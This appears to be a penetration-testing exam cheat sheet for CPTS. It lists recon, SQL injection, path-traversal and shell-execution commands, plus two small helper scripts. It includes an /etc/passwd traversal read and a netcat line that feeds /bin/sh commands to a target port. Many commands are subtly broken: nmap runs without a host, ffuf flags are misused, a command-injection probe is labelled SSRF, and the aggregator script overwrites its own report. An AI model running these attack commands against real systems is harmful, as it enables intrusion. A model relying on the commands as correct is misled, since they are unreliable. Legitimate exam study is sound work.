# CPTS Reporting & Proof Workflow

Forget academic fluff; report what you hit, prove what you broke, and document the chain. CPTS graders want evidence, not opinions. Use this flow to move from reconnaissance to proof-of-concept in one session.

## Attack Workflow

1.  **Recon & Mapping**: Get the topology and services live.
2.  **Vulnerability Discovery**: Identify specific flaws (SQLi, Auth, SSRF, RCE).
3.  **Payload Generation**: Craft precise payloads for the specific service.
4.  **PoC Execution**: Execute the payload and capture proof.
5.  **Evidence Consolidation**: Aggregate logs, screenshots, and text for the report.

## Commands Section

### 1. Recon & Port Mapping
```bash
nmap -sC -sV -oN target
nikto -h target --output nikto.txt
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -o found.txt
ffuf -u http://target -w /usr/share/wordlists/dirb/common.txt -s 500 -o fuf.txt
```
*Capture `nikto.txt` and `fuf.txt` as your primary vulnerability list.*

### 2. SSRF Enumeration & Proxy Attack
```bash
# Check for SSRF indicators
curl -s -H "User-Agent: curl/8.0" "http://target?cmd=cat /etc/os-release"
# Try to reach internal services
curl -s http://target/.well-known/links
# Map internal network
nmap -Pn --open -sC --script=http-headers -p- target
```

### 3. SQLi / Logic Flaws (Generic)
```bash
# SQLMap automated scan
sqlmap -u "http://target/" --dbs
# Manual boolean blind (example)
echo "1' AND (SELECT CASE WHEN (SELECT 1) THEN 1 ELSE 0 END) = 1 -- -" | nc target 80
```

### 4. PoC & Payload Execution
```bash
# RCE Proof (example Python payload)
echo -e "1\n/bin/sh\nid\nexit\nexit" | nc target 4444
# Bypass WAF simple (example)
curl -s "http://target/../../etc/passwd" | grep root
# Automated Fuzzing
ffuf -w /usr/share/wordlists/commonword/longwords.txt -u http://target -X POST -p param= --status-code 404
```

## Tips & Shortcuts

*   **Capture the Flag**: Always save the full output of the PoC command, not just the success/fail.
*   **Timestamp Everything**: Use `date` commands before each test to show execution order.
*   **Use `tee` for Duality**: `command | tee -a proof.log &` to save logs while viewing output.
*   **Screenshot Key Errors**: Take screenshots when WAFs block requests; they prove the evasion attempt.
*   **Verify Service**: Use `getent hosts` to confirm internal DNS resolution in SSRF tests.

## Common Mistakes

*   **Missing Timestamps**: No dates in logs = no proof of timeline.
*   **Over-Fuzzing**: Running `gobuster` for 30 mins instead of 3 minutes wastes exam time.
*   **No Chain**: Showing a vuln is not a proof; showing the chain (e.g., Port 80 -> Param -> SQLi -> DB) is required.
*   **Ignoring `nmap` Scripting**: Use `-sC --script=vuln` for quick, automated vulnerability checks.
*   **Assuming `curl` Works**: Network noise and WAFs block standard curl; try `--user-agent` and headers.

## Mini Automation Scripts

### Bash: Vulnerability Log Aggregator
Saves all `nmap`, `nikto`, and `ffuf` outputs into a single `report.txt`.

```bash
#!/bin/bash
echo "=== RECON REPORT START ===" | tee report.txt
nmap -sC -sV -oN target | tee report.txt
echo "--- Nikto Scan ---" | tee -a report.txt
nikto -h target --output nikto.txt | tee -a report.txt
echo "--- Directory Fuzz ---" | tee -a report.txt
ffuf -u http://target -w /usr/share/wordlists/dirb/common.txt -s 500 -o fuf.txt | tee -a report.txt
echo "=== REPORT END ===" | tee report.txt
```

### Python: Log Rotation & Cleanup
Keeps the report concise by rotating logs every 5MB.

```python
import os, datetime

LOG_FILE = "cpts_proof.log"
MAX_SIZE = 5 * 1024 * 1024  # 5MB

def check_rotate():
    if os.path.exists(LOG_FILE):
        size = os.path.getsize(LOG_FILE)
        if size > MAX_SIZE:
            f = open(LOG_FILE, "r")
            with open(f"{LOG_FILE}.backup", "w") as b:
                b.write(f.read())
            os.remove(LOG_FILE)

# Rotate log before writing new PoC
check_rotate()
print(datetime.datetime.now())
# Write evidence here
```